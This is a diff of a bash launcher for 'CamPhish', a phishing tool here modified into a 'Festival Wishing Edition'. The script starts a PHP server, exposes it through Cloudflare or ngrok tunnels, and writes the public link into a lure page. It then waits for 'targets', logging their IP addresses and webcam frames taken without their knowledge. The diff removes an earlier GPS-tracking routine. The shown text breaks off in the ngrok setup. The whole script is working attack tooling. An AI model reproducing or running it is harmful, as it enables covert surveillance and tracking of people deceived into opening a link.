@@ -1,33 +1,24 @@
 #!/bin/bash
-# CamPhish v2.0
-# Powered by TechChip
+# CamPhish v2.0 (Modified)
+# Festival Wishing Template Only
 
-# Windows compatibility check
-if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
-  # We're on Windows
+# ─── Windows compatibility ────────────────────────────────────────────────────
+if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || \
+   [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
   windows_mode=true
-  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
-  
-  # Define Windows-specific command replacements
-  function killall() {
-    taskkill /F /IM "$1" 2>/dev/null
-  }
-  
+  echo "Windows system detected."
+  function killall() { taskkill /F /IM "$1" 2>/dev/null; }
   function pkill() {
-    if [[ "$1" == "-f" ]]; then
-      shift
-      shift
-      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
-    else
-      taskkill /F /IM "$1" 2>/dev/null
-    fi
+    if [[ "$1" == "-f" ]]; then shift; shift; taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null;
+    else taskkill /F /IM "$1" 2>/dev/null; fi
   }
 else
   windows_mode=false
 fi
 
-trap 'printf "\n";stop' 2
+trap 'printf "\n"; stop' 2
 
+# ─── Banner ───────────────────────────────────────────────────────────────────
 banner() {
 clear
 printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
@@ -38,504 +29,284 @@ printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | 
 printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
-printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
-printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
-
+printf " \e[1;93m CamPhish Ver 2.0 \e[0m\n"
+printf " \e[1;77m Festival Wishing Edition \e[0m\n"
 printf "\n"
-
-
 }
 
+# ─── Dependencies ─────────────────────────────────────────────────────────────
 dependencies() {
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+  command -v php > /dev/null 2>&1 || {
+    echo >&2 "PHP is not installed. Run: pkg install php"
+    exit 1
+  }
 }
 
+# ─── Cleanup on exit ──────────────────────────────────────────────────────────
 stop() {
-if [[ "$windows_mode" == true ]]; then
-  # Windows-specific process termination
-  taskkill /F /IM "ngrok.exe" 2>/dev/null
-  taskkill /F /IM "php.exe" 2>/dev/null
-  taskkill /F /IM "cloudflared.exe" 2>/dev/null
-else
-  # Unix-like systems
-  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
-  checkphp=$(ps aux | grep -o "php" | head -n1)
-  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)
-
-  if [[ $checkngrok == *'ngrok'* ]]; then
-    pkill -f -2 ngrok > /dev/null 2>&1
-    killall -2 ngrok > /dev/null 2>&1
-  fi
-
-  if [[ $checkphp == *'php'* ]]; then
-    killall -2 php > /dev/null 2>&1
-  fi
-
-  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
-    pkill -f -2 cloudflared > /dev/null 2>&1
+  if [[ "$windows_mode" == true ]]; then
+    taskkill /F /IM "ngrok.exe"       2>/dev/null
+    taskkill /F /IM "php.exe"         2>/dev/null
+    taskkill /F /IM "cloudflared.exe" 2>/dev/null
+  else
+    pkill -f ngrok       > /dev/null 2>&1
+    pkill -f php         > /dev/null 2>&1
+    pkill -f cloudflared > /dev/null 2>&1
+    killall -2 ngrok       > /dev/null 2>&1
+    killall -2 php         > /dev/null 2>&1
     killall -2 cloudflared > /dev/null 2>&1
   fi
-fi
-
-exit 1
+  exit 1
 }
 
+# ─── Catch IP ─────────────────────────────────────────────────────────────────
 catch_ip() {
-ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-
-cat ip.txt >> saved.ip.txt
+  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+  IFS=$'\n'
+  printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+  cat ip.txt >> saved.ip.txt
 }
 
-catch_location() {
-  # First check for the current_location.txt file which is always created
-  if [[ -e "current_location.txt" ]]; then
-    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Current location data:\e[0m\n"
-    # Filter out unwanted messages before displaying
-    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
-    printf "\n"
-    
-    # Move it to a backup to avoid duplicate display
-    mv current_location.txt current_location.bak
-  fi
-
-  # Then check for any location_* files
-  if [[ -e "location_"* ]]; then
-    location_file=$(ls location_* | head -n 1)
-    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
-    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
-    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
-    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
-    
-    # Only display essential location data
-    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" $lat
-    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" $lon
-    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s meters\e[0m\n" $acc
-    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" $maps_link
-    
-    # Create directory for saved locations if it doesn't exist
-    if [[ ! -d "saved_locations" ]]; then
-      mkdir -p saved_locations
-    fi
-    
-    mv "$location_file" saved_locations/
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Location saved to saved_locations/%s\e[0m\n" "$location_file"
-  else
-    printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] No location file found\e[0m\n"
-    
-    # Don't display any debug logs to avoid showing unwanted messages
-  fi
-}
-
+# ─── Wait loop ────────────────────────────────────────────────────────────────
 checkfound() {
-# Create directory for saved locations if it doesn't exist
-if [[ ! -d "saved_locations" ]]; then
-  mkdir -p saved_locations
-fi
+  printf "\n"
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\e[1;77m Press Ctrl+C to exit\e[0m\n"
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Camera capture is \e[0m\e[1;93mACTIVE\e[0m\n"
+  while true; do
 
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
-while [ true ]; do
+    if [[ -e "ip.txt" ]]; then
+      printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\e[0m\n"
+      catch_ip
+      rm -f ip.txt
+    fi
 
-if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-catch_ip
-rm -rf ip.txt
-fi
+    if [[ -e "Log.log" ]]; then
+      printf "\e[1;92m[\e[0m+\e[1;92m] Cam frame received!\e[0m\n"
+      rm -f Log.log
+    fi
 
-sleep 0.5
-
-# Check for current_location.txt first (our new immediate indicator)
-if [[ -e "current_location.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
-catch_location
-fi
-
-# Also check for LocationLog.log (the original indicator)
-if [[ -e "LocationLog.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
-# Don't display the raw log content, just process it
-catch_location
-rm -rf LocationLog.log
-fi
-
-# Don't display error logs to avoid showing unwanted messages
-if [[ -e "LocationError.log" ]]; then
-# Just remove the file without displaying its contents
-rm -rf LocationError.log
-fi
-
-if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
-rm -rf Log.log
-fi
-sleep 0.5
-
-done 
+    sleep 0.5
+  done
 }
 
+# ─── Cloudflare: download binary ──────────────────────────────────────────────
+download_cloudflared() {
+  command -v wget > /dev/null 2>&1 || { echo >&2 "wget not found. Run: pkg install wget"; exit 1; }
+
+  arch=$(uname -m)
+  os=$(uname -s)
+  printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared (OS: $os, Arch: $arch)...\e[0m\n"
+
+  if [[ "$windows_mode" == true ]]; then
+    wget --no-check-certificate \
+      https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe \
+      -O cloudflared.exe > /dev/null 2>&1
+    [[ -e cloudflared.exe ]] && chmod +x cloudflared.exe || { printf "[!] Download failed\n"; exit 1; }
+    printf '#!/bin/bash\n./cloudflared.exe "$@"\n' > cloudflared
+    chmod +x cloudflared
+
+  elif [[ "$os" == "Darwin" ]]; then
+    [[ "$arch" == "arm64" ]] && \
+      url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz" || \
+      url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"
+    wget --no-check-certificate "$url" -O cloudflared.tgz > /dev/null 2>&1
+    tar -xzf cloudflared.tgz > /dev/null 2>&1 && chmod +x cloudflared && rm -f cloudflared.tgz \
+      || { printf "[!] Download failed\n"; exit 1; }
+
+  else
+    case "$arch" in
+      "x86_64")          dl="cloudflared-linux-amd64" ;;
+      "i686"|"i386")     dl="cloudflared-linux-386"   ;;
+      "aarch64"|"arm64") dl="cloudflared-linux-arm64"  ;;
+      "armv7l"|"armv6l") dl="cloudflared-linux-arm"    ;;
+      *)                 dl="cloudflared-linux-amd64" ;;
+    esac
+    wget --no-check-certificate \
+      "https://github.com/cloudflare/cloudflared/releases/latest/download/$dl" \
+      -O cloudflared > /dev/null 2>&1
+    [[ -e cloudflared ]] && chmod +x cloudflared || { printf "[!] Download failed\n"; exit 1; }
+  fi
+}
+
+# ─── Cloudflare tunnel ────────────────────────────────────────────────────────
 cloudflare_tunnel() {
-if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
-echo ""
-else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
+  [[ -e cloudflared ]] || [[ -e cloudflared.exe ]] || download_cloudflared
 
-# Detect architecture
-arch=$(uname -m)
-os=$(uname -s)
-printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"
+  printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\e[0m\n"
+  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+  sleep 2
 
-# Windows detection
-if [[ "$windows_mode" == true ]]; then
-    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
-    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
-    if [[ -e cloudflared.exe ]]; then
-        chmod +x cloudflared.exe
-        # Create a wrapper script to run the exe
-        echo '#!/bin/bash' > cloudflared
-        echo './cloudflared.exe "$@"' >> cloudflared
-        chmod +x cloudflared
-    else
-        printf "\e[1;93m[!] Download error... \e[0m\n"
-        exit 1
-    fi
-else
-    # Non-Windows systems
-    # macOS detection
-    if [[ "$os" == "Darwin" ]]; then
-        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
-        if [[ "$arch" == "arm64" ]]; then
-            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
-            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
-        else
-            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
-            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
-        fi
-        
-        if [[ -e cloudflared.tgz ]]; then
-            tar -xzf cloudflared.tgz > /dev/null 2>&1
-            chmod +x cloudflared
-            rm cloudflared.tgz
-        else
-            printf "\e[1;93m[!] Download error... \e[0m\n"
-            exit 1
-        fi
-    # Linux and other Unix-like systems
-    else
-        case "$arch" in
-            "x86_64")
-                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
-                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
-                ;;
-            "i686"|"i386")
-                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
-                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
-                ;;
-            "aarch64"|"arm64")
-                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
-                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
-                ;;
-            "armv7l"|"armv6l"|"arm")
-                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
-                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
-                ;;
-            *)
-                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
-                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
-                ;;
-        esac
-        
-        if [[ -e cloudflared ]]; then
-            chmod +x cloudflared
-        else
-            printf "\e[1;93m[!] Download error... \e[0m\n"
-            exit 1
-        fi
-    fi
-fi
-fi
+  printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflared tunnel...\e[0m\n"
+  rm -f .cloudflared.log
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 &
-sleep 2
-
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
-rm -f .cloudflared.log > /dev/null 2>&1
-
-if [[ "$windows_mode" == true ]]; then
+  if [[ "$windows_mode" == true ]]; then
     ./cloudflared.exe tunnel --url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
-else
+  else
     ./cloudflared tunnel --url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
-fi
+  fi
 
-# --- Retry loop: wait up to 60 seconds for the tunnel URL (important for slow Android/Termux) ---
-link=""
-max_wait=60
-waited=0
-printf "\e[1;92m[\e[0m*\e[1;92m] Waiting for tunnel URL"
-while [[ -z "$link" && $waited -lt $max_wait ]]; do
+  # Retry loop — up to 60 seconds (important on slow Android/Termux connections)
+  link=""
+  max_wait=60
+  waited=0
+  printf "\e[1;92m[\e[0m*\e[1;92m] Waiting for tunnel URL"
+  while [[ -z "$link" && $waited -lt $max_wait ]]; do
     sleep 2
     waited=$((waited + 2))
     printf "."
     if [[ -e ".cloudflared.log" ]]; then
-        # Try both URL formats cloudflare uses (trycloudflare.com)
-        link=$(grep -o 'https://[-0-9a-zA-Z]*\.trycloudflare\.com' ".cloudflared.log" | head -n1)
-        # Fallback: some versions print the URL differently
-        if [[ -z "$link" ]]; then
-            link=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' ".cloudflared.log" | head -n1)
-        fi
-        # Fallback: grep the raw log for any https tunnel URL
-        if [[ -z "$link" ]]; then
-            link=$(grep -oE 'https://[^ "]+trycloudflare[^ "]+' ".cloudflared.log" | head -n1)
-        fi
+      link=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' ".cloudflared.log" | head -n1)
+      [[ -z "$link" ]] && link=$(grep -oE 'https://[^ "]+trycloudflare[^ "]+' ".cloudflared.log" | head -n1)
     fi
-done
-printf "\n"
+  done
+  printf "\n"
 
-if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run: killall cloudflared\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url http://127.0.0.1:3333\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check log: cat .cloudflared.log\n"
-exit 1
-else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
-fi
-payload_cloudflare
-checkfound
+  if [[ -z "$link" ]]; then
+    printf "\e[1;31m[!] Could not get tunnel URL. Possible reasons:\e[0m\n"
+    printf "\e[1;93m    - CloudFlare service is down\e[0m\n"
+    printf "\e[1;93m    - On Android: enable hotspot\e[0m\n"
+    printf "\e[1;93m    - Cloudflared already running: killall cloudflared\e[0m\n"
+    printf "\e[1;93m    - Check internet connection\e[0m\n"
+    printf "\e[1;93m    - Debug: cat .cloudflared.log\e[0m\n"
+    exit 1
+  fi
+
+  printf "\e[1;92m[\e[0m*\e[1;92m] Link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+  payload_cloudflare "$link"
+  checkfound
 }
 
-payload_cloudflare() {
-link=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' ".cloudflared.log" | head -n1)
-sed 's+forwarding_link+'$link'+g' template.php > index.php
-if [[ $option_tem -eq 1 ]]; then
-sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
-sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-elif [[ $option_tem -eq 2 ]]; then
-sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-else
-sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
-fi
-rm -rf index3.html
+# ─── Ngrok: download binary ───────────────────────────────────────────────────
+download_ngrok() {
+  command -v wget  > /dev/null 2>&1 || { echo >&2 "wget not found. Run: pkg install wget";  exit 1; }
+  command -v unzip > /dev/null 2>&1 || { echo >&2 "unzip not found. Run: pkg install unzip"; exit 1; }
+
+  arch=$(uname -m)
+  os=$(uname -s)
+  printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok (OS: $os, Arch: $arch)...\e[0m\n"
+  base="https://bin.equinox.io/c/bNyj1mQVY4c"
+
+  if [[ "$windows_mode" == true ]]; then
+    wget --no-check-certificate "$base/ngrok-v3-stable-windows-amd64.zip" -O ngrok.zip > /dev/null 2>&1
+    unzip ngrok.zip > /dev/null 2>&1 && chmod +x ngrok.exe && rm -f ngrok.zip \
+      || { printf "[!] Download failed\n"; exit 1; }
+
+  elif [[ "$os" == "Darwin" ]]; then
+    [[ "$arch" == "arm64" ]] && zf="ngrok-v3-stable-darwin-arm64.zip" || zf="ngrok-v3-stable-darwin-amd64.zip"
+    wget --no-check-certificate "$base/$zf" -O ngrok.zip > /dev/null 2>&1
+    unzip ngrok.zip > /dev/null 2>&1 && chmod +x ngrok && rm -f ngrok.zip \
+      || { printf "[!] Download failed\n"; exit 1; }
+
+  else
+    case "$arch" in
+      "x86_64")          zf="ngrok-v3-stable-linux-amd64.zip" ;;
+      "i686"|"i386")     zf="ngrok-v3-stable-linux-386.zip"   ;;
+      "aarch64"|"arm64") zf="ngrok-v3-stable-linux-arm64.zip"  ;;
+      "armv7l"|"armv6l") zf="ngrok-v3-stable-linux-arm.zip"    ;;
+      *)                 zf="ngrok-v3-stable-linux-amd64.zip" ;;
+    esac
+    wget --no-check-certificate "$base/$zf" -O ngrok.zip > /dev/null 2>&1
+    unzip ngrok.zip > /dev/null 2>&1 && chmod +x ngrok && rm -f ngrok.zip \
+      || { printf "[!] Download failed\n"; exit 1; }
+  fi
 }
 
+# ─── Ngrok tunnel ─────────────────────────────────────────────────────────────
 ngrok_server() {
-if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
-echo ""
-else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+  [[ -e ngrok ]] || [[ -e ngrok.exe ]] || download_ngrok
 
-# Detect architecture
-arch=$(uname -m)
-os=$(uname -s)
-printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"
+  # Auth token
+  if [[ "$windows_mode" == true ]]; then
+    local cfg="$USERPROFILE\.ngrok2\ngrok.yml"
+  else
+    local cfg="$HOME/.ngrok2/ngrok.yml"
+  fi
 
-# Windows detection
-if [[ "$windows_mode" == true ]]; then
-    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
-    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
-    if [[ -e ngrok.zip ]]; then
-        unzip ngrok.zip > /dev/null 2>&1
-        chmod +x ngrok.exe
-        rm -rf ngrok.zip
-    else
-        printf "\e[1;93m[!] Download error... \e[0m\n"
-        exit 1
+  if [[ -e "$cfg" ]]; then
+    printf "\e[1;93m[\e[0m*\e[1;93m] Existing ngrok config found.\e[0m\n"
+    read -p $'\e[1;92m[\e[0m+\e[1;92m] Change authtoken? [y/N]: \e[0m' chg_token
+    if [[ $chg_token == "Y" || $chg_token == "y" ]]; then
+      read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter ngrok authtoken: \e[0m' ngrok_auth
+      [[ "$windows_mode" == true ]] && ./ngrok.exe authtoken "$ngrok_auth" > /dev/null 2>&1 \
+                                    || ./ngrok authtoken "$ngrok_auth" > /dev/null 2>&1
     fi
-else
-    # macOS detection
-    if [[ "$os" == "Darwin" ]]; then
-        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
-        if [[ "$arch" == "arm64" ]]; then
-            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
-            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
-        else
-            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
-            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
-        fi
-        
-        if [[ -e ngrok.zip ]]; then
-            unzip ngrok.zip > /dev/null 2>&1
-            chmod +x ngrok
-            rm -rf ngrok.zip
-        else
-            printf "\e[1;93m[!] Download error... \e[0m\n"
-            exit 1
-        fi
-    # Linux and other Unix-like systems
-    else
-        case "$arch" in
-            "x86_64")
-                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
-                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
-                ;;
-            "i686"|"i386")
-                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
-                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1
-                ;;
-            "aarch64"|"arm64")
-                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
-                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1
-                ;;
-            "armv7l"|"armv6l"|"arm")
-                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
-                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1
-                ;;
-            *)
-                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
-                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
-                ;;
-        esac
-        
-        if [[ -e ngrok.zip ]]; then
-            unzip ngrok.zip > /dev/null 2>&1
-            chmod +x ngrok
-            rm -rf ngrok.zip
-        else
-            printf "\e[1;93m[!] Download error... \e[0m\n"
-            exit 1
-        fi
-    fi
-fi
-fi
+  else
+    read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter ngrok authtoken: \e[0m' ngrok_auth
+    [[ "$windows_mode" == true ]] && ./ngrok.exe authtoken "$ngrok_auth" > /dev/null 2>&1 \
+                                  || ./ngrok authtoken "$ngrok_auth" > /dev/null 2>&1
+  fi
 
-# Ngrok auth token handling
-if [[ "$windows_mode" == true ]]; then
-    if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
-        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
-        cat "$USERPROFILE\.ngrok2\ngrok.yml"
-        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
-        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-            ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
-            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
-        fi
-    else
-        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-        ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
-    fi
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-    sleep 2
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-    ./ngrok.exe http 3333 > /dev/null 2>&1 &
-else
-    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
-        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
-        cat  ~/.ngrok2/ngrok.yml
-        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
-        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-            ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
-        fi
-    else
-        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-        ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-    fi
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-    sleep 2
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-    ./ngrok http 3333 > /dev/null 2>&1 &
-fi
+  printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\e[0m\n"
+  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+  sleep 2
+  printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok tunnel...\e[0m\n"
+  [[ "$windows_mode" == true ]] && ./ngrok.exe http 3333 > /dev/null 2>&1 & \
+                                 || ./ngrok http 3333 > /dev/null 2>&1 &
+  sleep 10
 
-sleep 10
+  link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -oE 'https://[^"]*\.ngrok-free\.app' | head -n1)
+  if [[ -z "$link" ]]; then
